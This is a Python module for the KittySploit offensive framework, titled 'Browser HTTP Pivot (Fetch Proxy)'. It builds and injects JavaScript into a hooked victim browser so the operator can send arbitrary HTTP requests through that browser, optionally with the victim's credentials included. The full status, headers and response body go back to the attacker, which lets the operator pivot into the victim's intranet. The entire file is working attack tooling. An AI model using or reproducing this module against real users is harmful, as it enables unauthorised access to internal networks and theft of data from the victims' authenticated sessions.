from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Browser HTTP Pivot (Fetch Proxy)",
		"description": "Issue HTTP requests from the hooked browser and return status/headers/body (intranet pivot)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	url = OptString("", "Target URL to fetch from the victim browser", True)
	method = OptString("GET", "HTTP method (GET, POST, PUT, DELETE, HEAD, OPTIONS)", False)
	headers = OptString("{}", "Request headers as JSON object", False)
	body = OptString("", "Request body (for POST/PUT/PATCH)", False)
	credentials = OptString("omit", "Fetch credentials mode: omit | same-origin | include", False)
	max_body = OptInteger(65536, "Max response body bytes to return", False)
	timeout = OptInteger(12, "Client-side fetch timeout (seconds)", False)

	def run(self):
		target = str(self.url or "").strip()
		if not target:
			print_error("url is required")
			return False

		method = str(self.method or "GET").strip().upper() or "GET"
		try:
			headers_obj = json.loads(str(self.headers or "{}") or "{}")
			if not isinstance(headers_obj, dict):
				raise ValueError("headers must be a JSON object")
		except (json.JSONDecodeError, ValueError) as exc:
			print_error(f"Invalid headers JSON: {exc}")
			return False

		creds = str(self.credentials or "omit").strip().lower()
		if creds not in ("omit", "same-origin", "include"):
			print_error("credentials must be omit, same-origin, or include")
			return False

		max_body = max(256, int(self.max_body or 65536))
		timeout_s = max(1, int(self.timeout or 12))
		timeout_ms = timeout_s * 1000

		url_js = json.dumps(target)
		method_js = json.dumps(method)
		headers_js = json.dumps(headers_obj)
		body_js = json.dumps(str(self.body) if self.body else None)
		creds_js = json.dumps(creds)

		code_js = f"""
		(function() {{
			const URL = {url_js};
			const METHOD = {method_js};
			const HEADERS = {headers_js};
			const BODY = {body_js};
			const CREDENTIALS = {creds_js};
			const MAX_BODY = {max_body};
			const TIMEOUT_MS = {timeout_ms};

			function truncate(text, maxLen) {{
				if (text == null) return null;
				const s = String(text);
				if (s.length <= maxLen) {{
					return {{ value: s, truncated: false, length: s.length }};
				}}
				return {{ value: s.slice(0, maxLen), truncated: true, length: s.length }};
			}}

			return new Promise(function(resolve) {{
				const controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
				const timer = setTimeout(function() {{
					if (controller) {{
						try {{ controller.abort(); }} catch (e) {{}}
					}}
				}}, TIMEOUT_MS);

				const init = {{
					method: METHOD,
					credentials: CREDENTIALS,
					redirect: 'follow',
					mode: 'cors'
				}};
				if (controller) {{
					init.signal = controller.signal;
				}}
				if (HEADERS && Object.keys(HEADERS).length) {{
					init.headers = HEADERS;
				}}
				if (BODY != null && METHOD !== 'GET' && METHOD !== 'HEAD') {{
					init.body = BODY;
				}}

				const started = Date.now();
				fetch(URL, init)
					.then(function(resp) {{
						const headerMap = {{}};
						try {{
							resp.headers.forEach(function(v, k) {{ headerMap[k] = v; }});
						}} catch (e) {{}}
						return resp.text().then(function(text) {{
							clearTimeout(timer);
							const bodyInfo = truncate(text, MAX_BODY);
							resolve(JSON.stringify({{
								ok: true,
								url: URL,
								final_url: resp.url || URL,
								method: METHOD,
								status: resp.status,
								status_text: resp.statusText || '',
								redirected: !!resp.redirected,
								type: resp.type || '',
								headers: headerMap,
								body: bodyInfo.value,
								body_length: bodyInfo.length,
								body_truncated: bodyInfo.truncated,
								elapsed_ms: Date.now() - started,
								origin: window.location.origin,
								page_url: window.location.href
							}}));
						}});
					}})
					.catch(function(err) {{
						clearTimeout(timer);
						const msg = err && err.name === 'AbortError'
							? 'timeout'
							: (err.message || String(err));
						resolve(JSON.stringify({{
							ok: false,
							url: URL,
							method: METHOD,
							error: msg,
							elapsed_ms: Date.now() - started,
							origin: window.location.origin,
							page_url: window.location.href,
							hint: 'CORS, mixed content, network unreachable, or browser blocked the request'
						}}));
					}});
			}});
		}})();
		"""

		print_status(f"Pivoting {method} {target} via browser session...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(timeout_s + 8))
		if not result:
			print_error("Failed to run fetch proxy")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse fetch proxy response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		print_info("=" * 60)
		print_info("Browser HTTP Pivot")
		print_info(f"  Page origin: {data.get('origin', '?')}")
		print_info(f"  Request: {data.get('method', method)} {data.get('url', target)}")
		print_info(f"  Elapsed: {data.get('elapsed_ms', '?')} ms")

		if not data.get("ok"):
			print_error(f"  Request failed: {data.get('error', 'unknown')}")
			if data.get("hint"):
				print_info(f"  Hint: {data['hint']}")
			return False

		print_success(f"  Status: {data.get('status')} {data.get('status_text', '')}".rstrip())
		if data.get("final_url") and data.get("final_url") != data.get("url"):
			print_info(f"  Final URL: {data['final_url']}")
		if data.get("redirected"):
			print_info("  Redirected: yes")

		headers = data.get("headers") or {}
		if headers:
			print_info("-" * 60)
			print_status("Response headers:")
			for key in sorted(headers.keys()):
				print_info(f"  {key}: {headers[key]}")

		body = data.get("body")
		print_info("-" * 60)
		length = data.get("body_length", 0)
		truncated = " (truncated)" if data.get("body_truncated") else ""
		print_status(f"Body ({length} bytes{truncated}):")
		if body is None or body == "":
			print_info("  <empty>")
		else:
			preview = body if len(body) <= 4000 else body[:4000] + "\n... [preview truncated in console]"
			print_info(preview)

		return True
